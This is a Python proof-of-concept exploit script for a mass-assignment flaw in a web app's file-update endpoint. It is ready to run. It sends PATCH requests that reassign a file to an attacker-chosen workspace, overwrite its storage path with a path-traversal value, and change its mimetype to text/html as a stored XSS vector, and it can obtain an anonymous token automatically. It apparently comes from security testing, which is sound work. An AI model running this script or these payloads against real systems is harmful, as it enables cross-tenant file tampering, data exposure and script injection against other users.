#!/usr/bin/env python3
"""
PoC #10 — Mass Assignment in File Update: Cross-Workspace File Reassignment
HIGH: PATCH /files/:id passes body directly to updateFile.
filterFieldsBeforeUpdate does NOT strip workspaceId or path.

Usage: python3 poc_10_file_mass_assignment.py --target https://dev.example.com --file-id FILE_ID --token AUTH_TOKEN
"""

import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()


def test_workspace_reassignment(base_url, file_id, token, target_workspace_id):
    """Attempt to change a file's workspaceId via PATCH."""
    print(f"\n[*] Test 1: Reassign file to workspace {target_workspace_id}...")

    url = f"{base_url}/v2/workspaces/any/files/{file_id}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    payload = {
        "workspaceId": target_workspace_id,
    }

    try:
        r = requests.patch(url, headers=headers, json=payload, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            new_ws = data.get("workspaceId", "unknown")
            print(f"  [HIGH] File updated! New workspaceId: {new_ws}")
            if new_ws == target_workspace_id:
                print(f"  [CRITICAL] File reassigned to target workspace!")
            print(f"  Response: {json.dumps(data, indent=2)[:500]}")
            return True
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_path_overwrite(base_url, file_id, token):
    """Attempt to change a file's storage path."""
    print(f"\n[*] Test 2: Change file storage path...")

    url = f"{base_url}/v2/workspaces/any/files/{file_id}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    payload = {
        "path": "../../other-workspace/sensitive-file.txt",
    }

    try:
        r = requests.patch(url, headers=headers, json=payload, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"  [HIGH] Path overwritten!")
            print(f"  New path: {data.get('path', 'unknown')}")
            return True
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_mimetype_override(base_url, file_id, token):
    """Change mimetype to enable XSS on download."""
    print(f"\n[*] Test 3: Override mimetype to text/html (stored XSS vector)...")

    url = f"{base_url}/v2/workspaces/any/files/{file_id}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    payload = {
        "mimetype": "text/html",
        "name": "harmless.html",
    }

    try:
        r = requests.patch(url, headers=headers, json=payload, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"  [HIGH] Mimetype overridden to: {data.get('mimetype', 'unknown')}")
            print(f"  [INFO] File will be served as HTML — XSS if content is controlled")
            return True
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description="PoC #10: File Mass Assignment")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--file-id", required=True, help="File ID to modify")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    parser.add_argument("--target-workspace", default="attacker-workspace-id", help="Workspace ID to reassign to")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print(f"[*] File ID: {args.file_id}")
    print("=" * 60)

    results = {}
    results["workspace_reassign"] = test_workspace_reassignment(base, args.file_id, args.token, args.target_workspace)
    results["path_overwrite"] = test_path_overwrite(base, args.file_id, args.token)
    results["mimetype_override"] = test_mimetype_override(base, args.file_id, args.token)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'VULNERABLE' if v else 'NOT VULNERABLE'}")


if __name__ == "__main__":
    main()
